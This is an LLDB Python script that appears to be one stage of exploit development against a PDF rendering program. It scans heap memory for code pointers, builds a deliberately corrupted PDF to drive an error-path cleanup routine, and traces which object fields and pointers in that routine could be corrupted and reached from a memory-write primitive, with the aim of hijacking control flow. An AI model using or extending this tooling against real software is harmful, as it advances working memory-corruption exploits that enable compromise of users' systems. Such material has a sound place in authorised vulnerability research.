# RIP-23: consumer hunt.
# A: arena code-ptr scan at walk hits (find callback/vtable-class data in strh reach).
# B: ERROR-PATH finalize: corrupt pdf -> decode fails -> data_release_info with
#    dp-class object (MUTEX 0x4d555458) -> dump x8 chain from x0 (2-level search)
#    -> report the corruptible address + reach vs x27.
import os, sys, struct, time
import lldb
t = lldb.debugger.GetSelectedTarget()
CWD = os.getcwd()
TRACE = open(os.path.join(CWD, "rip23_trace.txt"), "a")
def T(s): print(s, flush=True); TRACE.write(s+"\n"); TRACE.flush()
err = lldb.SBError()

def qwords(p, addr, n):
    m = p.ReadMemory(addr, n*8, err)
    if not err.Success() or not m: return None
    return [struct.unpack('<Q', m[i*8:i*8+8])[0] for i in range(n)]

def wr(p, addr, data):
    p.WriteMemory(addr, data, err)
    return err.Success()

def fresh():
    old = t.GetProcess()
    if old and old.IsValid() and old.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
        old.Kill(); time.sleep(0.2)

def wait_stop(p, budget=25):
    p.Continue()
    st = p.GetState()
    t0 = time.time()
    while st == lldb.eStateRunning:
        if time.time() - t0 > budget:
            try: p.Stop(); time.sleep(0.5); st = p.GetState()
            except Exception: pass
            if st == lldb.eStateRunning:
                try: p.Kill()
                except Exception: pass
                return lldb.eStateKilled
            return st
        time.sleep(0.1); st = p.GetState()
    return st

def killp(p):
    try:
        if p and p.IsValid() and p.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
            p.Kill()
    except Exception: pass

def fnm(fr):
    try: return fr.GetSymbol().GetName() or "?"
    except Exception: return "?"

def pcoff(fr):
    try:
        if fr.GetSymbol():
            return fr.GetPCAddress().GetLoadAddress(t) - fr.GetSymbol().GetStartAddress().GetLoadAddress(t)
    except Exception: pass
    return -1

def is_codeish(q):
    return 0x100000000 <= q < 0x200000000

# ---- PHASE-A: arena code-ptr scan at walk stops ----
fresh()
be = t.BreakpointCreateByName("aa_cache_render"); be.SetOneShot(True)
bw_host = {}
p = t.LaunchSimple(["k2_d31472.pdf", "r.png"], None, CWD)
if p and p.IsValid():
    th = p.GetSelectedThread()
    pc = th.GetSelectedFrame().GetPCAddress().GetLoadAddress(t)
    bw = t.BreakpointCreateByAddress(pc + 1804)
    bf = t.BreakpointCreateByName("data_release_info")
    x27 = 0
    wh = 0
    for i in range(200):
        st = wait_stop(p)
        if st != lldb.eStateStopped: break
        fr = p.GetSelectedThread().GetSelectedFrame()
        nm = fnm(fr); off = pcoff(fr)
        if off == 1804:
            wh += 1
            x27 = fr.FindRegister("x27").GetValueAsUnsigned()
            if wh in (2, 4, 6):
                lo = x27 - 0x8000
                qs = qwords(p, lo, 0x10000//8)
                if qs:
                    hits = [(hex(lo + j*8), hex(q)) for j, q in enumerate(qs) if is_codeish(q)]
                    T("A walk#%d x27=%x code-class-in-arena(%d): %s" % (wh, x27, len(hits), hits[:24]))
            p.Continue()
        elif "data_release_info" in nm:
            T("A FIN x0=%x" % fr.FindRegister("x0").GetValueAsUnsigned())
            break
        else:
            p.Continue()
    killp(p)
    for b in (be, bw, bf):
        if b: t.BreakpointDelete(b.GetID())

# ---- PHASE-B: error-path finalize (corrupt pdf) ----
# build a corrupted pdf: flip bytes in the content stream
src = os.path.join(CWD, "k2_d31472.pdf")
dst = os.path.join(CWD, "k2_bad.pdf")
data = bytearray(open(src, "rb").read())
# corrupt inside the stream: find 'Tj' and zap around it
idx = data.find(b'Tj')
if idx > 0:
    data[idx-6:idx] = b'\xff\xff\xff\xff\xff\xff'
open(dst, "wb").write(bytes(data))
T("B built k2_bad.pdf (%d bytes, Tj@%d zapped)" % (len(data), idx))

fresh()
be = t.BreakpointCreateByName("aa_cache_render"); be.SetOneShot(True)
p = t.LaunchSimple(["k2_bad.pdf", "r.png"], None, CWD)
if p and p.IsValid():
    th = p.GetSelectedThread()
    pc = th.GetSelectedFrame().GetPCAddress().GetLoadAddress(t)
    bw = t.BreakpointCreateByAddress(pc + 1804)
    bf = t.BreakpointCreateByName("data_release_info")
    x27 = 0; x19 = 0
    for i in range(200):
        st = wait_stop(p)
        if st != lldb.eStateStopped:
            T("B decode ended st=%s rc=%s" % (st, p.GetExitStatus() if p.IsValid() else -1)); break
        fr = p.GetSelectedThread().GetSelectedFrame()
        nm = fnm(fr); off = pcoff(fr)
        if off == 1804:
            x19 = fr.FindRegister("x19").GetValueAsUnsigned()
            x27 = fr.FindRegister("x27").GetValueAsUnsigned()
            p.Continue()
        elif "data_release_info" in nm:
            x0 = fr.FindRegister("x0").GetValueAsUnsigned()
            x8 = 0
            r8 = fr.FindRegister("x8")
            if r8 and r8.IsValid(): x8 = r8.GetValueAsUnsigned()
            T("B FIN x0=%x x8=%x x27=%x x19=%x" % (x0, x8, x27, x19))
            obj = qwords(p, x0, 0x130//8)
            T("B obj: %s" % ([hex(q) for q in obj] if obj else None))
            has_mutex = obj and (0x4d555458 in obj or any((q & 0xFFFFFFFF) == 0x4d555458 for q in obj))
            T("B dp-class(MUTEX 0x4d555458)=%s" % bool(has_mutex))
            # 2-level search for x8's source
            if obj:
                l1 = [(j*8) for j, q in enumerate(obj) if q == x8]
                T("B x8 direct in x0: %s" % l1)
                if not l1:
                    # level2: dereference each ptr field, search there
                    for j, q in enumerate(obj):
                        if 0x100000000 <= q < 0x800000000000 and (q & 7) == 0:
                            sub = qwords(p, q, 0x30)
                            if sub:
                                l2 = [k*8 for k, s in enumerate(sub) if s == x8]
                                if l2:
                                    T("B x8 = *(x0+%x)+%x  [deref target=%x]" % (j*8, l2[0], q))
                    # also look for the dp fn-ptr signature fields
                    fps = [(j*8, hex(q)) for j, q in enumerate(obj) if is_codeish(q)]
                    T("B obj code-class fields: %s" % fps)
            # reach check
            if x27:
                T("B REACH: x0-x27=%x (strh reach needs |d|<2MB, 64B aligned-ish)" % (x0 - x27))
            killp(p); break
        else:
            p.Continue()
    killp(p)
    for b in (be, bw, bf):
        if b: t.BreakpointDelete(b.GetID())
T("RIP-23 DONE")
TRACE.close()
